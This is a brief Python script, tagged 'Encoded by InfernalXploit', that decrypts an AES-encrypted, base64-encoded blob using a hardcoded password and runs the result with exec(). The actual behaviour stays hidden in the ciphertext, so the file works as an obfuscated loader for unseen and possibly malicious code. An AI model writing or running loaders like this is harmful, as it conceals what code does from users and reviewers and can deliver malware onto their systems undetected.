
# Encoded by InfernalXploit
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt(enc_data, password):
    key = hashlib.sha256(password.encode()).digest()
    enc_bytes = base64.b64decode(enc_data)
    iv = enc_bytes[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(enc_bytes[AES.block_size:]), AES.block_size).decode()

password = "12345678910"
exec(decrypt("ocsRFiItcyWocJZ7kRRUbUe/VWMvoB2OegDAWuBAGHhcdH5ycx99PJ9yiLylyZwVjTCgdhuVrZ4/xZreWB80NWgLmMzpvuu/nEWqcPlf03zJWPRsym+3p87OtqQp5SKidFy9O+EdPanYMlZ0oOVH4neqHA01jQ4asCI9PhHaG1L72E0ZmY2g54uw8jhX2xgpj/WNxmY84OsIR0B2ddH/3Rf3FDd6WImJ8ALSdVSnKD5D6bcA1JyjLxOegDb0qers4lDWDrKYkjDfS7yN8ScmEaZwiKdY1dIebZwcmvFY6F/xerSSAgfRS1G9B+F/AKktKXOwvrcjSV8PfgV4GI5GIy1XkBNyRzqktkH7uq6W7AdpbcpDaC3u//VudZha+4xQORwSnG4/dWb+74TeNWzBsDJKBAev4Y1aNUIGUBcj6CBtMQipgyE9VF9AAv1x4irQKFxA9SZzaerUT06ax+sDfdUAs5ZHUo6DPYIq95Eg1Ma+g90CZpdsHo2TDKNDV1tJ", password))
